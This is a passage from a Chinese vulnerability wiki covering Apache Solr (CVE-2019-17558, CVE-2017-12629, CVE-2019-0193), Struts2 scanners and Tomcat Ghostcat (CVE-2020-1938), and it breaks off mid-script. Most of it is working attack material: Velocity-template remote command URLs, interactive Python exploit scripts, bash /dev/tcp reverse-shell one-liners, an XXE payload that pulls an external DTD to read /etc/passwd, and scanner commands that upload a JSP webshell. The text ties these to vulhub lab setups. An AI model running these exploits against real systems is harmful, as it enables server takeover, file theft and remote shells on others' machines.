http://xxx.xxx.xxx.xxx:8983/solr/test/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=\"\")+%23set($rt=$x.class.forName(\"java.lang.Runtime\"))+%23set($chr=$x.class.forName('java.lang.Character'))+%23set($str=$x.class.forName(\"java.lang.String\"))+%23set($ex=$rt.getRuntime().exec(\"whoami\"))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end 反弹hell，因为部分命令会被过滤导致返回 Error 500 ，所以反弹shell需要用另外的反弹shell方法 POC : /bin/bash -c $@|bash 0 echo bash -i >& /dev/tcp/xxx.xxx.xxx.xxx:9999 0>&1 POC需要Urlencoding进行编码才能绕过 POC ： %2Fbin%2Fbash%20-c%20%24%40%7Cbash%200%20echo%20bash%20-i%20%3E%26%2Fdev%2Ftcp%2F{IP}%2F{PORT}%200%3E%261 漏洞利用POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import sys import json def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: Apache Solr 5.0.0 - 8.3.1 \\033[0m') print('+ \\033[36m使用格式: python3 cve-2019-17558.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx:8983 \\033[0m') print('+ \\033[36mCmd >>> whoami(命令执行) \\033[0m') print('+ \\033[36mCmd >>> shell(反弹shell) \\033[0m') print('+------------------------------------------') def POC_1(target_url): core_url = target_url + \"/solr/admin/cores?indexInfo=false&wt=json\" try: response = requests.request(\"GET\", url=core_url, timeout=10) core_name = list(json.loads(response.text)[\"status\"])[0] print(\"\\033[32m[o] 成功获得core_name,Url为：\" + target_url + \"/solr/\" + core_name + \"/config\\033[0m\") return core_name except: print(\"\\033[31m[x] 目标Url漏洞利用失败\\033[0m\") sys.exit(0) def POC_2(target_url, core_name): open_params = target_url + \"/solr/\" + core_name + \"/config\" headers = { \"Content-Type\": \"application/json\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } set_api_data = \"\"\" { \"update-queryresponsewriter\": { \"startup\": \"lazy\", \"name\": \"velocity\", \"class\": \"solr.VelocityResponseWriter\", \"template.base.dir\": \"\", \"solr.resource.loader.enabled\": \"true\", \"params.resource.loader.enabled\": \"true\" } } \"\"\" response = requests.request(\"POST\", url=open_params, data=set_api_data, headers=headers, timeout=10) if response.status_code == 200: print(\"\\033[32m[o] POST请求成功将params.resource.loader.enabled设置为True \\033[0m\") else: print(\"\\033[31m[x] POST请求params.resource.loader.enabled设置为True失败 \\033[0m\") sys.exit(0) def POC_3(target_url, core_name, cmd): vnul_url = target_url + \"/solr/\" + core_name + \"/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27\" + cmd + \"%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end\" headers = { \"Content-Type\": \"application/json\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } response = requests.request(\"GET\", url=vnul_url, headers=headers, timeout=10) if \"Error 500\" in response.text: print(\"\\033[31m[x] 代码执行失败，响应为 Error 500 \\033[0m\") else: print(\"\\033[32m[o] 漏洞成功利用,响应为\\n \\033[0m\",response.text) def POC_4(target_url, core_name, IP, POST): # POC : /bin/bash -c $@|bash 0 echo bash -i >& /dev/tcp/xxx.xxx.xxx.xxx:9999 0>&1 cmd = \"%2Fbin%2Fbash%20-c%20%24%40%7Cbash%200%20echo%20bash%20-i%20%3E%26%2Fdev%2Ftcp%2F{}%2F{}%200%3E%261\".format(IP, POST) vnul_url = target_url + \"/solr/\" + core_name + \"/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27\" + cmd + \"%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end\" headers = { \"Content-Type\": \"application/json\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } response = requests.request(\"GET\", url=vnul_url, headers=headers) if __name__ == \"__main__\": title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) core_name = POC_1(target_url) POC_2(target_url, core_name) while True: cmd = input(\"\\033[35mCmd >>> \\033[0m\") if cmd == \"exit\": exit(0) elif cmd == \"shell\": IP = str(input(\"\\033[35m请输入监听IP >>> \\033[0m\")) PORT = str(input(\"\\033[35m请输入监听PORT >>> \\033[0m\")) POC_4(target_url, core_name, IP, PORT) else: POC_3(target_url, core_name, cmd) PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/Web服务器漏洞/Apache/Apache Solr/Apache Solr XXE 漏洞 CVE-2017-12629.html":{"url":"PeiQi_Wiki/Web服务器漏洞/Apache/Apache Solr/Apache Solr XXE 漏洞 CVE-2017-12629.html","title":"Apache Solr XXE 漏洞 CVE-2017-12629","keywords":"","body":"Apache Solr XXE 漏洞 CVE-2017-12629 漏洞描述 Apache Solr 是一个开源的搜索服务器。Solr 使用 Java 语言开发，主要基于 HTTP 和 Apache Lucene 实现。原理大致是文档通过Http利用XML加到一个搜索集合中。查询该集合也是通过 http收到一个XML/JSON响应来实现。此次7.1.0之前版本总共爆出两个漏洞：XML实体扩展漏洞（XXE）和远程命令执行漏洞（RCE）。 影响版本 Apache Solr 环境搭建 https://github.com/vulhub/vulhub.git cd vulhub/solr/CVE-2017-12629-XXE docker-compose build docker-compose up -d 漏洞复现 Dnslog 先请求url地址获取 core 内容 http://xxx.xxx.xxx.xxx:8983/solr/admin/cores 访问 http://xxx.xxx.xxx.xxx:8983/solr/demo/select?q={!xmlparser v=''}&wt=xml 查看dnslog得到请求 远程读取文件 在自己的服务器上写入一个可访问的XML文件，内容写入 \"> 然后请求这个文件来读取服务器上的文件 http://xxx.xxx.xxx.xxx:8983/solr/demo/select?&q=%3C%3fxml+version%3d%221.0%22+%3f%3E%3C!DOCTYPE+root%5b%3C!ENTITY+%25+ext+SYSTEM+%22http%3a%2f%2fpeiqi.tech%2f1.dtd%22%3E%25ext%3b%25ent%3b%5d%3E%3Cr%3E%26data%3b%3C%2fr%3E&wt=xml&defType=xmlparser [!NOTE] 注意这里的payload进行了url编码,请求的文件为 http://peiqi.tech/1.dtd，有更多需求自行更改写入的xml文件 漏洞利用POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import sys import json import random def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: Apache Solr >> http://xxx.xxx.xxx.xxx:8983 \\033[0m') print('+ \\033[36mcmd >>> dnslog地址(漏洞外连检测) \\033[0m') print('+ \\033[36mCmd >>> xxe_file(读取/etc/passwd) \\033[0m') print('+------------------------------------------') def POC_1(target_url): core_url = target_url + \"/solr/admin/cores?indexInfo=false&wt=json\" try: response = requests.request(\"GET\", url=core_url, timeout=10) core_name = list(json.loads(response.text)[\"status\"])[0] print(\"\\033[32m[o] 成功获得core_name,Url为：\" + target_url + \"/solr/\" + core_name + \"/config\\033[0m\") return core_name except: print(\"\\033[31m[x] 目标Url漏洞利用失败\\033[0m\") sys.exit(0) def POC_2(target_url, core_name, dnslog_url): dns_payload = \"\"\" /solr/%s/select?q={!xmlparser v=''}&wt=xml \"\"\" % (core_name, dnslog_url) vuln_url = target_url + dnslog_url headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } try: response = requests.request(\"GET\", url=vuln_url, headers=headers, timeout=30) if \"HTTP ERROR 500\" in response.text: print(\"\\033[31m[x] 漏洞利用失败 \\033[0m\") else: print(\"\\033[32m[o] 请查看dnslog响应 \\033[0m\") except: print(\"\\033[31m[x] 漏洞利用失败 \\033[0m\") def POC_3(target_url, core_name): file_payload = \"\"\"/solr/{}/select?&q=%3C%3fxml+version%3d%221.0%22+%3f%3E%3C!DOCTYPE+root%5b%3C!ENTITY+%25+ext+SYSTEM+%22http%3a%2f%2fpeiqi.tech%2f1.dtd%22%3E%25ext%3b%25ent%3b%5d%3E%3Cr%3E%26data%3b%3C%2fr%3E&wt=xml&defType=xmlparser\"\"\".format(core_name) vuln_url = target_url + file_payload headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } response = requests.request(\"GET\", url=vuln_url, headers=headers, timeout=30) if \"/usr/sbin\" in response.text: print(\"\\033[32m[o] 漏洞成功利用,响应为\\n \\033[0m\",response.text) else: print(\"\\033[31m[x] 漏洞利用失败 \\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) core_name = POC_1(target_url) while True: n = random.randint(1, 9999) cmd = input(\"\\033[35mCmd >>> \\033[0m\") if cmd == \"exit\": exit(0) elif cmd == \"dnslog\": dnslog_url = str(input('\\033[35m请输入你的dnslog地址：\\033[0m')) POC_2(target_url, core_name, dnslog_url, n) elif cmd == \"xxe_file\": POC_3(target_url, core_name) PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/Web服务器漏洞/Apache/Apache Solr/Apache Solr 远程执行漏洞 CVE-2019-0193.html":{"url":"PeiQi_Wiki/Web服务器漏洞/Apache/Apache Solr/Apache Solr 远程执行漏洞 CVE-2019-0193.html","title":"Apache Solr 远程执行漏洞 CVE-2019-0193","keywords":"","body":"Apache Solr 远程执行漏洞 CVE-2019-0193 漏洞描述 2019 年 08 月 01 日，Apache Solr 官方发布预警，Apache Solr DataImport 功能 在开启 Debug 模式时，可以接收来自请求的”dataConfig”参数，这个参数的功能与data-config.xml 一样，不过是在开启 Debug 模式时方便通过此参数进行调试，并且 Debug 模式的开启是通过参数传入的。在 dataConfig 参数中可以包含 script 恶意脚本导致远程代码执行。 影响版本 [!NOTE] Apache Solr 环境搭建 https://github.com/vulhub/vulhub.git cd vulhub/solr/CVE-2019-0193 docker-compose build docker-compose up -d # 创建一个solr核心test docker-compose exec solr bash bin/solr create_core -c test -d example/example-DIH/solr/db 访问 http://xxx.xxx.xxx.xxx:8983/solr/ 正常即可 漏洞复现 点击刚刚创建的test进入调试 将下面的POC代码填入 Debug-Mode 中 注意 POC 执行的代码中的base64字符串的位置请置换成自己的ip地址并base64加密填入 [!NOTE] bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/9999 0>&1 直接如上写入反弹无反应，不稳定，需要base64加密写才能反弹一个shell 点击EXecute执行代码 成功反弹shell 漏洞利用POC [!NOTE] POC不支持反弹shell，如需反弹shell，请按如上步骤反弹shell #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import sys import json def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: Apache Solr >> http://xxx.xxx.xxx.xxx:8983 \\033[0m') print('+ \\033[36mCmd >>> whoami(命令执行) \\033[0m') print('+------------------------------------------') def POC_1(target_url): core_url = target_url + \"/solr/admin/cores?indexInfo=false&wt=json\" try: response = requests.request(\"GET\", url=core_url, timeout=10) core_name = list(json.loads(response.text)[\"status\"])[0] print(\"\\033[32m[o] 成功获得core_name,Url为：\" + target_url + \"/solr/\" + core_name + \"/config\\033[0m\") return core_name except: print(\"\\033[31m[x] 目标Url漏洞利用失败\\033[0m\") sys.exit(0) def POC_2(target_url, core_name): mode_url = target_url + \"/solr/\" + core_name + \"/admin/mbeans?cat=QUERY&wt=json\" response = requests.request(\"GET\", url=mode_url, timeout=20) mode = dict(dict(list(json.loads(response.text)[\"solr-mbeans\"])[1])['/dataimport'])['class'] if \"org.apache.solr.handler.dataimport.DataImportHandler\" in mode: print(\"\\033[32m[o] 目标Url,Dataimport模块开启\\033[0m\") else: print(\"\\033[31m[x] 目标Url,Dataimport模块未开启\\033[0m\") sys.exit(0) def POC_3(target_url, core_name, cmd): vuln_url = target_url + \"/solr/\" + core_name + \"/dataimport\" headers = { 'Host': target_url, 'User-Agent': \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", 'Accept': \"application/json, text/plain, */*\", 'Accept-Language': \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\", 'Accept-Encoding': \"zip, deflate\", 'Referer': \"\" + target_url + \"/solr/\", 'Content-type': \"application/x-www-form-urlencoded\", 'X-Requested-With': \"XMLHttpRequest\", 'Content-Length': \"1007\", 'Connection': \"close\" } payload = \"\"\" command=full-import&verbose=false&clean=false&commit=false&debug=true&core=test&name=dataimport&dataConfig= \"\"\" % cmd response = requests.request(\"POST\", url=vuln_url, data=payload, headers=headers, timeout=30) try: get_message = list(json.loads(response.text)[\"documents\"])[0] message = dict(get_message)['title'][0] print(\"\\033[32m[o] 漏洞成功利用,响应为\\n \\033[0m\", message) except: print(\"\\033[31m[x] 代码执行失败 \\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) core_name = POC_1(target_url) POC_2(target_url, core_name) while True: cmd = input(\"\\033[35mCmd >>> \\033[0m\") if cmd == \"exit\": exit(0) else: POC_3(target_url, core_name, cmd) 参考文章 apache solr远程代码执行漏洞(cve-2019-0193) PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/Web服务器漏洞/Apache/Apache Struts2/":{"url":"PeiQi_Wiki/Web服务器漏洞/Apache/Apache Struts2/","title":"Apache Struts 2","keywords":"","body":"Apache Struts2 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/Web服务器漏洞/Apache/Apache Struts2/Scan/":{"url":"PeiQi_Wiki/Web服务器漏洞/Apache/Apache Struts2/Scan/","title":"Scan","keywords":"","body":"扫描工具 Exphub Apache Struts2 Struts2-Scan PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/Web服务器漏洞/Apache/Apache Struts2/Scan/扫描工具 Exphub-Strtus2.html":{"url":"PeiQi_Wiki/Web服务器漏洞/Apache/Apache Struts2/Scan/扫描工具 Exphub-Strtus2.html","title":"扫描工具 Exphub-Strtus2","keywords":"","body":"About Apache Struts2 Python脚本放在当前目录的POC文件夹中 Vulnerability list struts2-032_cmd.py Struts2 method 任意代码执行漏洞GetShell利用脚本(CVE-2016-3081)struts2-032_poc.py Struts2 method 任意代码执行漏洞检测脚本(CVE-2016-3081)struts2-045_cmd.py Struts2 Jakarta Multipart parser 插件远程命令执行漏洞利用脚本1(CVE-2017-5638)[使用]struts2-045-2_cmd.py Struts2 Jakarta Multipart parser 插件远程命令执行漏洞利用脚本2(CVE-2017-5638)[使用]struts2-052_cmd.py Struts2 REST 插件远程代码执行漏洞利用脚本(CVE-2017-9805)struts2-052_webshell.py Struts2 REST 插件远程代码执行漏洞上传Webshell脚本(CVE-2017-9805)struts2-053_cmd.py Struts2 Freemarker 标签远程执行命令漏洞利用脚本(CVE-2017-12611)struts2-057_cmd.py Struts2 Namespace 远程代码执行漏洞利用脚本(CVE-2018-11776) Readme 部分脚本文件使用说明，详细使用分析请参考vulnerability-list中的[使用] VER: 漏洞影响版本，一般情况下不在影响范围的版本没有相关漏洞 USE: 脚本文件使用说明，大部分写在了脚本里，执行即可见 EXP: 脚本利用示例，以及执行效果 DES: 部分特殊脚本文件的特殊描述 参考来源 ExpHub PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/Web服务器漏洞/Apache/Apache Struts2/Scan/扫描工具 Struts2-Scan.html":{"url":"PeiQi_Wiki/Web服务器漏洞/Apache/Apache Struts2/Scan/扫描工具 Struts2-Scan.html","title":"扫描工具 Struts2-Scan","keywords":"","body":"Struts2-Scan 漏洞验证 工具地址 Struts2-Scan 工具描述 Struts2漏洞利用扫描工具，基于互联网上已经公开的Structs2高危漏洞exp的扫描利用工具，目前支持的漏洞如下: S2-001, S2-003, S2-005, S2-007, S2-008, S2-009, S2-012, S2-013, S2-015, S2-016, S2-019, S2-029, S2-032, S2-033, S2-037, S2-045, S2-046, S2-048, S2-052, S2-053, S2-devMode, S2-057 支持单个URL漏洞检测和批量URL检测，至此指定漏洞利用，可获取WEB路径，执行命令，反弹shell和上传文件，注意，并不是所有的漏洞均支持上述功能，只有部分功能支持 运行环境 Python3.6.X及其以上版本 第三方库: click, requests, bs4 测试环境: Ubuntu 16.04 漏洞环境已上传，参考地址： https://github.com/Medicean/VulApps/tree/master/s/struts2/ https://github.com/vulhub/vulhub/tree/master/struts2 工具参数 Usage: Struts2Scan.py [OPTIONS] Struts2批量扫描利用工具 Options: -i, --info 漏洞信息介绍 -v, --version 显示工具版本 -u, --url TEXT URL地址 -n, --name TEXT 指定漏洞名称, 漏洞名称详见info -f, --file TEXT 批量扫描URL文件, 一行一个URL -d, --data TEXT POST参数, 需要使用的payload使用{exp}填充, 如: name=test&passwd={exp} -c, --encode TEXT 页面编码, 默认UTF-8编码 -p, --proxy TEXT HTTP代理. 格式为http://ip:port -t, --timeout TEXT HTTP超时时间, 默认10s -w, --workers TEXT 批量扫描进程数, 默认为10个进程 --header TEXT HTTP请求头, 格式为: key1=value1&key2=value2 -e, --exec 进入命令执行shell --webpath 获取WEB路径 -r, --reverse TEXT 反弹shell地址, 格式为ip:port --upfile TEXT 需要上传的文件路径和名称 --uppath TEXT 上传的目录和名称, 如: /usr/local/tomcat/webapps/ROOT/shell.jsp -q, --quiet 关闭打印不存在漏洞的输出，只保留存在漏洞的输出 -h, --help Show this message and exit. 使用例子 查看漏洞详细信息: $ python3 Struts2Scan.py --info ____ _ _ ____ ____ / ___|| |_ _ __ _ _| |_ ___|___ \\ / ___| ___ __ _ _ __ \\___ \\| __| '__| | | | __/ __| __) | \\___ \\ / __/ _` | '_ \\ ___) | |_| | | |_| | |_\\__ \\/ __/ ___) | (_| (_| | | | | |____/ \\__|_| \\__,_|\\__|___/_____| |____/ \\___\\__,_|_| |_| Author By HatBoy [+] 支持如下Struts2漏洞: [+] S2-001:影响版本Struts 2.0.0-2.0.8; POST请求发送数据; 默认参数为:username,password; 支持获取WEB路径,任意命令执行和反弹shell [+] S2-003:影响版本Struts 2.0.0-2.0.11.2; GET请求发送数据; 支持任意命令执行 [+] S2-005:影响版本Struts 2.0.0-2.1.8.1; GET请求发送数据; 支持获取WEB路径,任意命令执行 [+] S2-007:影响版本Struts 2.0.0-2.2.3; POST请求发送数据; 默认参数为:username,password; 支持任意命令执行和反弹shell [+] S2-008:影响版本Struts 2.1.0-2.3.1; GET请求发送数据; 支持任意命令执行和反弹shell [+] S2-009:影响版本Struts 2.0.0-2.3.1.1; GET请求发送数据,URL后面需要请求参数名; 默认为: key; 支持任意命令执行和反弹shell [+] S2-012:影响版本Struts Showcase App 2.0.0-2.3.13; GET请求发送数据,参数直接添加到URL后面; 默认为:name; 支持任意命令执行和反弹shell [+] S2-013/S2-014:影响版本Struts 2.0.0-2.3.14.1; GET请求发送数据; 支持获取WEB路径,任意命令执行,反弹shell和文件上传 [+] S2-015:影响版本Struts 2.0.0-2.3.14.2; GET请求发送数据; 支持任意命令执行和反弹shell [+] S2-016:影响版本Struts 2.0.0-2.3.15; GET请求发送数据; 支持获取WEB路径,任意命令执行,反弹shell和文件上传 [+] S2-019:影响版本Struts 2.0.0-2.3.15.1; GET请求发送数据; 支持获取WEB路径,任意命令执行,反弹shell和文件上传 [+] S2-029:影响版本Struts 2.0.0-2.3.24.1(除了2.3.20.3); POST请求发送数据,需要参数; 默认参数:message; 支持任意命令执行和反弹shell [+] S2-032:影响版本Struts 2.3.20-2.3.28(除了2.3.20.3和2.3.24.3); GET请求发送数据; 支持获取WEB路径,任意命令执行和反弹shell [+] S2-033:影响版本Struts 2.3.20-2.3.28(除了2.3.20.3和2.3.24.3); GET请求发送数据; 支持任意命令执行和反弹shell [+] S2-037:影响版本Struts 2.3.20-2.3.28.1; GET请求发送数据; 支持获取WEB路径,任意命令执行和反弹shell [+] S2-045:影响版本Struts 2.3.5-2.3.31,2.5-2.5.10; POST请求发送数据,不需要参数; 支持获取WEB路径,任意命令执行,反弹shell和文件上传 [+] S2-046:影响版本Struts 2.3.5-2.3.31,2.5-2.5.10; POST请求发送数据,不需要参数; 支持获取WEB路径,任意命令执行,反弹shell和文件上传 [+] S2-048:影响版本Struts 2.3.x with Struts 1 plugin and Struts 1 action; POST请求发送数据; 默认参数为:username,password; 支持任意命令执行和反弹shell [+] S2-053:影响版本Struts 2.0.1-2.3.33,2.5-2.5.10; POST请求发送数据; 默认参数为:username,password; 支持任意命令执行和反弹shell [+] S2-devMode:影响版本Struts 2.1.0-2.3.1; GET请求发送数据; 支持获取WEB路径,任意命令执行和反弹shell 单个URL漏洞检测: $ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action ____ _ _ ____ ____ / ___|| |_ _ __ _ _| |_ ___|___ \\ / ___| ___ __ _ _ __ \\___ \\| __| '__| | | | __/ __| __) | \\___ \\ / __/ _` | '_ \\ ___) | |_| | | |_| | |_\\__ \\/ __/ ___) | (_| (_| | | | | |____/ \\__|_| \\__,_|\\__|___/_____| |____/ \\___\\__,_|_| |_| Author By HatBoy [+] 正在扫描URL:http://192.168.100.8:8080/index.action [*] ----------------results------------------ [*] http://192.168.100.8:8080/index.action 存在漏洞: S2-046 [*] http://192.168.100.8:8080/index.action 存在漏洞: S2-016 [*] http://192.168.100.8:8080/index.action 存在漏洞: S2-045 [*] http://192.168.100.8:8080/index.action 存在漏洞: S2-015 [*] http://192.168.100.8:8080/index.action 存在漏洞: S2-009 [*] http://192.168.100.8:8080/index.action 存在漏洞: S2-012 批量漏洞检测: $ python3 Struts2Scan.py -f urls.txt POST数据: $ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action -d name=admin&email=admin&age={exp} 指定漏洞名称利用: # 命令执行 $ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action -n S2-016 --exec ____ _ _ ____ ____ / ___|| |_ _ __ _ _| |_ ___|___ \\ / ___| ___ __ _ _ __ \\___ \\| __| '__| | | | __/ __| __) | \\___ \\ / __/ _` | '_ \\ ___) | |_| | | |_| | |_\\__ \\/ __/ ___) | (_| (_| | | | | |____/ \\__|_| \\__,_|\\__|___/_____| |____/ \\___\\__,_|_| |_| Author By HatBoy >>>ls -la total 136 drwxr-sr-x 1 root staff 4096 May 5 2017 . drwxrwsr-x 1 root staff 4096 May 5 2017 .. -rw-r----- 1 root root 57092 Apr 13 2017 LICENSE -rw-r----- 1 root root 1723 Apr 13 2017 NOTICE -rw-r----- 1 root root 7064 Apr 13 2017 RELEASE-NOTES -rw-r----- 1 root root 15946 Apr 13 2017 RUNNING.txt drwxr-x--- 1 root root 4096 May 5 2017 bin drwx--S--- 1 root root 4096 Jul 12 14:54 conf drwxr-sr-x 3 root staff 4096 May 5 2017 include drwxr-x--- 2 root root 4096 May 5 2017 lib drwxr-x--- 1 root root 4096 Jul 12 14:54 logs drwxr-sr-x 3 root staff 4096 May 5 2017 native-jni-lib drwxr-x--- 2 root root 4096 May 5 2017 temp drwxr-x--- 1 root root 4096 Jul 12 14:54 webapps drwxr-x--- 1 root root 4096 Jul 12 14:54 work >>> # 反弹shll $ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action -n S2-016 --reverse 192.168.100.8:8888 ____ _ _ ____ ____ / ___|| |_ _ __ _ _| |_ ___|___ \\ / ___| ___ __ _ _ __ \\___ \\| __| '__| | | | __/ __| __) | \\___ \\ / __/ _` | '_ \\ ___) | |_| | | |_| | |_\\__ \\/ __/ ___) | (_| (_| | | | | |____/ \\__|_| \\__,_|\\__|___/_____| |____/ \\___\\__,_|_| |_| Author By HatBoy [*] 请在反弹地址处监听端口如: nc -lvvp 8080 # 获取WEB路径 $ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action -n S2-016 --webpath ____ _ _ ____ ____ / ___|| |_ _ __ _ _| |_ ___|___ \\ / ___| ___ __ _ _ __ \\___ \\| __| '__| | | | __/ __| __) | \\___ \\ / __/ _` | '_ \\ ___) | |_| | | |_| | |_\\__ \\/ __/ ___) | (_| (_| | | | | |____/ \\__|_| \\__,_|\\__|___/_____| |____/ \\___\\__,_|_| |_| Author By HatBoy [*] /usr/local/tomcat/webapps/ROOT/ # 上传shell $ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action -n S2-016 --upfile shell.jsp --uppath /usr/local/tomcat/webapps/ROOT/shell.jsp ____ _ _ ____ ____ / ___|| |_ _ __ _ _| |_ ___|___ \\ / ___| ___ __ _ _ __ \\___ \\| __| '__| | | | __/ __| __) | \\___ \\ / __/ _` | '_ \\ ___) | |_| | | |_| | |_\\__ \\/ __/ ___) | (_| (_| | | | | |____/ \\__|_| \\__,_|\\__|___/_____| |____/ \\___\\__,_|_| |_| Author By HatBoy [+] 文件上传成功! 关于 因部分原因，原作者关闭漏洞利用，如需利用可删除以下代码使用 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/Web服务器漏洞/Apache/Apache Tomcat/":{"url":"PeiQi_Wiki/Web服务器漏洞/Apache/Apache Tomcat/","title":"Apache Tomcat","keywords":"","body":"Apache Tomcat Aapache Tomcat AJP 文件包含漏洞 CVE-2020-1938 Apache Tomcat 远程代码执行漏洞 CVE-2017-12615 Apache Tomcat WebSocket 拒绝服务漏洞 CVE-2020-13935 PeiQi WiKi文库 all right reserved，powered by Gitbook文件更新时间： 2021-01-16 04:33:19 "},"PeiQi_Wiki/Web服务器漏洞/Apache/Apache Tomcat/Apache Tomcat AJP 文件包含漏洞 CVE-2020-1938.html":{"url":"PeiQi_Wiki/Web服务器漏洞/Apache/Apache Tomcat/Apache Tomcat AJP 文件包含漏洞 CVE-2020-1938.html","title":"Apache Tomcat AJP 文件包含漏洞 CVE-2020-1938","keywords":"","body":"Aapache Tomcat AJP 文件包含漏洞 CVE-2020-1938 漏洞描述 Java 是目前 Web 开发中最主流的编程语言，而 Tomcat 是当前最流行的 Java 中间件服务器之一，从初版发布到现在已经有二十多年历史，在世界范围内广泛使用。 Ghostcat（幽灵猫） 是由长亭科技安全研究员发现的存在于 Tomcat 中的安全漏洞，由于 Tomcat AJP 协议设计上存在缺陷，攻击者通过 Tomcat AJP Connector 可以读取或包含 Tomcat 上所有 webapp 目录下的任意文件，例如可以读取 webapp 配置文件或源代码。此外在目标应用有文件上传功能的情况下，配合文件包含的利用还可以达到远程代码执行的危害。 影响版本 [!NOTE] Apache Tomcat 6 Apache Tomcat 7 Apache Tomcat 8 Apache Tomcat 9 环境搭建 https://github.com/vulhub/vulhub.git cd vulhub/tomcat/CVE-2020-1938 docker-compose up -d 访问 http://xxx.xxx.xxx.xxx:8080/ 正常即可 漏洞复现 目前有可靠的利用脚本 Gihub工具下载链接 python CNVD-2020-10487-Tomcat-Aj p-lfi.py -p 8009 -f /WEB-INF/web.xml xxx.xxx.xxx.xxx [!NOTE] 脚本需要使用python2来运行，此漏洞用于上传路径可控，开放8009端口AJP协议情况下通过读取文件执行命令 漏洞利用POC https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi/blob/master/CNVD-2020-10487-Tomcat-Ajp-lfi.py #!/usr/bin/env python #CNVD-2020-10487 Tomcat-Ajp lfi #by ydhcui import struct # Some references: # https://tomcat.apache.org/connectors-doc/ajp/ajpv13a.html def pack_string(s): if s is None: return struct.pack(\">h\", -1) l = len(s) return struct.pack(\">H%dsb\" % l, l, s.encode('utf8'), 0) def unpack(stream, fmt): size = struct.calcsize(fmt) buf = stream.read(size) return struct.unpack(fmt, buf) def unpack_string(stream): size, = unpack(stream, \">h\") if size == -1: # null string return None res, = unpack(stream, \"%ds\" % size) stream.read(1) # \\0 return res class NotFoundException(Exception): pass class AjpBodyRequest(object): # server == web server, container == servlet SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = range(2) MAX_REQUEST_LENGTH = 8186 def __init__(self, data_stream, data_len, data_direction=None): self.data_stream = data_stream self.data_len = data_len self.data_direction = data_direction def serialize(self): data = self.data_stream.read(AjpBodyRequest.MAX_REQUEST_LENGTH) if len(data) == 0: return struct.pack(\">bbH\", 0x12, 0x34, 0x00) else: res = struct.pack(\">H\", len(data)) res += data if self.data_direction == AjpBodyRequest.SERVER_TO_CONTAINER: header = struct.pack(\">bbH\", 